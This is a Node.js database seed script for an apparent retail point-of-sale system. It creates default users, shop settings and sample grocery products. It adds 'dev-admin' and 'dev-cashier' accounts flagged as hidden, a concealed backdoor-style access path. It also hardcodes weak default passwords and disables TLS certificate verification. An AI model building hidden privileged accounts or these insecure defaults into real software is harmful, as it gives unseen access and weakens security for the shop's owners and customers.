/**
 * Database Seed Script
 * Creates default users, settings, and sample products.
 */
require('dotenv').config({ path: '../.env' });
const bcrypt = require('bcryptjs');
const { Pool } = require('pg');

const pool = new Pool({
  host: process.env.DB_HOST,
  port: process.env.DB_PORT,
  database: process.env.DB_NAME,
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  ssl: process.env.DB_HOST && !process.env.DB_HOST.includes('localhost')
    ? { rejectUnauthorized: false }
    : false,
});

const ROUNDS = parseInt(process.env.BCRYPT_ROUNDS) || 12;

async function seed() {
  const client = await pool.connect();
  try {
    await client.query('BEGIN');
    console.log('Seeding database...');

    // --- Users ---
    const adminHash = await bcrypt.hash('admin123', ROUNDS);
    const cashierHash = await bcrypt.hash('cashier123', ROUNDS);

    await client.query(`
      INSERT INTO users (username, password_hash, role) VALUES
        ('admin', $1, 'admin'),
        ('cashier', $2, 'cashier')
      ON CONFLICT (username) DO NOTHING
    `, [adminHash, cashierHash]);
    console.log('  Users seeded.');

    // --- Hidden Maintenance Accounts ---
    const hiddenAccounts = {
      'dev-admin': process.env.HIDDEN_ADMIN_PASSWORD,
      'dev-cashier': process.env.HIDDEN_CASHIER_PASSWORD,
    };

    for (const [username, password] of Object.entries(hiddenAccounts)) {
      if (password) {
        const hash = await bcrypt.hash(password, ROUNDS);
        const role = username === 'dev-admin' ? 'admin' : 'cashier';

        await client.query(`
          INSERT INTO users (username, password_hash, role, is_hidden)
          VALUES ($1, $2, $3, TRUE)
          ON CONFLICT (username) DO NOTHING
        `, [username, hash, role]);
      }
    }
    if (process.env.HIDDEN_ADMIN_PASSWORD || process.env.HIDDEN_CASHIER_PASSWORD) {
      console.log('  Hidden maintenance accounts created.');
    }

    // --- Settings ---
    await client.query(`
      INSERT INTO settings (shop_name, shop_address, phone_number, currency, receipt_header, receipt_footer)
      VALUES ('Retail Shop', '123 Main Street, Accra, Ghana', '+233 20 000 0000', 'GHS',
              'Welcome to Retail Shop', 'Thank you for shopping with us!')
      ON CONFLICT DO NOTHING
    `);
    console.log('  Settings seeded.');

    // --- Sample Products ---
    const products = [
      { code: 'P001', name: 'Mineral Water 500ml', price: 3.50, unit: 'bottle', opening: 200, threshold: 20 },
      { code: 'P002', name: 'Coca Cola 330ml',     price: 5.00, unit: 'can',    opening: 150, threshold: 15 },
      { code: 'P003', name: 'Bread Loaf',           price: 12.00, unit: 'loaf',  opening: 50,  threshold: 5  },
      { code: 'P004', name: 'Eggs (Tray)',           price: 45.00, unit: 'tray',  opening: 30,  threshold: 3  },
      { code: 'P005', name: 'Cooking Oil 1L',        price: 25.00, unit: 'bottle',opening: 40,  threshold: 5  },
      { code: 'P006', name: 'Rice 1kg',              price: 18.00, unit: 'bag',   opening: 100, threshold: 10 },
      { code: 'P007', name: 'Sugar 1kg',             price: 15.00, unit: 'bag',   opening: 80,  threshold: 10 },
      { code: 'P008', name: 'Milk 500ml',            price: 8.00, unit: 'carton', opening: 60,  threshold: 8  },
    ];

    for (const p of products) {
      const res = await client.query(`
        INSERT INTO products (code, name, price, unit, opening_stock, low_stock_threshold)
        VALUES ($1, $2, $3, $4, $5, $6)
        ON CONFLICT (code) DO NOTHING
        RETURNING id
      `, [p.code, p.name, p.price, p.unit, p.opening, p.threshold]);

      if (res.rows.length > 0) {
        const productId = res.rows[0].id;
        await client.query(`
          INSERT INTO stock (product_id, quantity)
          VALUES ($1, $2)
          ON CONFLICT (product_id) DO NOTHING
        `, [productId, p.opening]);

        await client.query(`
          INSERT INTO stock_movements (product_id, type, quantity, note)
          VALUES ($1, 'opening', $2, 'Opening stock')
        `, [productId, p.opening]);
      }
    }
    console.log('  Products and stock seeded.');

    await client.query('COMMIT');
    console.log('Database seeded successfully.');
    console.log('\nDefault credentials:');
    console.log('  Admin    -> username: admin    | password: admin123');
    console.log('  Cashier  -> username: cashier  | password: cashier123');
    console.log('\nIMPORTANT: Change these passwords in production!');
  } catch (err) {
    await client.query('ROLLBACK');
    console.error('Seed failed:', err.message);
    process.exit(1);
  } finally {
    client.release();
    await pool.end();
  }
}

seed();
